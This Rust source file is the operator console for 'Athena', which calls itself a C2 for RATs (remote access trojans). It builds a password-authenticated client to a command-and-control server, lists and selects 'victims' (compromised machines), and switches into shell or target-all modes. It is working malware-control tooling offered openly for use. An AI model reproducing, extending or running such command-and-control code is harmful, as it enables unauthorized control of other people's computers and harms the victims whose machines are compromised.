/*
 * Copyright (C) 2021  Aravinth Manivannan <realaravinth@batsense.net>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
use std::io::{stdin, BufWriter, Write};

use libathena::{payload::attack, AthenaClient, AthenaClientBuilder, AthenaResult, Client};

pub mod commands;
pub mod errors;
pub mod handlers;
pub mod options;

const DEFAULT_PROMPT: &str = "(athena)";
const SHELL_PROMPT: &str = "(shell)";
const TARGET_ALL: &str = "(all)";

pub const VERSION: &str = env!("CARGO_PKG_VERSION");

use errors::*;

#[derive(Debug, PartialEq, Clone)]
pub enum Mode {
    Default,
    TargetAll,
    Shell,
    Exit,
}

impl Mode {
    pub fn print_and_read<W: Write>(&self, s: &mut State<W>, i: &mut String) -> CliResult<()> {
        match self {
            Self::Default => {
                s.default_prompt()?;
                Self::read_input(i)?;
            }

            Self::Shell => {
                s.shell_prompt()?;
                Self::read_input(i)?;
            }

            Self::TargetAll => {
                s.targetall_prompt()?;
                Self::read_input(i)?;
            }

            Self::Exit => (),
        }
        Ok(())
    }

    fn read_input(input: &mut String) -> CliResult<()> {
        input.clear();
        stdin().read_line(input)?;
        Ok(())
    }
}

pub struct State<W: Write> {
    pub write: BufWriter<W>,
    pub mode: Mode,
    pub client: AthenaClient,
    pub victims: Vec<attack::Victim>,
}

impl<W: Write> State<W> {
    pub async fn new(write: W, options: &options::Options) -> AthenaResult<Self> {
        let write = BufWriter::new(write);
        let mode = Mode::Default;

        let client = AthenaClientBuilder::default()
            .client(Client::builder())?
            .password(options.password.clone())
            .host(options.c2.clone())
            .build()?;

        let victims = client.attack_list_victims().await?;

        Ok(Self {
            mode,
            write,
            client,
            victims,
        })
    }

    pub async fn refresh_victims(&mut self) -> AthenaResult<()> {
        self.victims = self.client.attack_list_victims().await?;
        Ok(())
    }

    pub fn welcome(&mut self) -> CliResult<()> {
        writeln!(
            self.write,
            r#"Athena {} - C2 for Rats
Aravinth Mavnivannan<realaravinth@batsense.net>
Be nice."#,
            VERSION,
        )?;
        Ok(())
    }

    pub fn default_prompt(&mut self) -> CliResult<()> {
        write!(self.write, "{} => ", DEFAULT_PROMPT)?;
        self.write.flush()?;
        Ok(())
    }

    pub fn shell_prompt(&mut self) -> CliResult<()> {
        write!(self.write, "{}{}", DEFAULT_PROMPT, SHELL_PROMPT)?;
        self.write.flush()?;
        Ok(())
    }

    pub fn targetall_prompt(&mut self) -> CliResult<()> {
        write!(self.write, "{}{}", DEFAULT_PROMPT, TARGET_ALL)?;
        self.write.flush()?;
        Ok(())
    }

    pub fn list_victims(&mut self) -> CliResult<()> {
        if self.victims.is_empty() {
            writeln!(self.write, "No victims on C2 server")?;
        } else {
            writeln!(self.write, "Victims")?;
            writeln!(self.write, "=======")?;
            for (count, victim) in self.victims.iter().enumerate() {
                writeln!(self.write, "[{}] {}", count, victim.name)?;
            }
            writeln!(self.write, "Pick a victim")?;
        }
        self.write.flush()?;
        Ok(())
    }

    pub fn select_victim(&mut self, input: &mut String) -> CliResult<()> {
        self.list_victims()?;
        self.mode.clone().print_and_read(self, input)?;
        let mut victims = Vec::with_capacity(1);
        victims.push(
            self.victims
                .get(input.trim().parse::<usize>().unwrap())
                .unwrap()
                .to_owned(),
        );
        self.victims = victims;
        Ok(())
    }
}
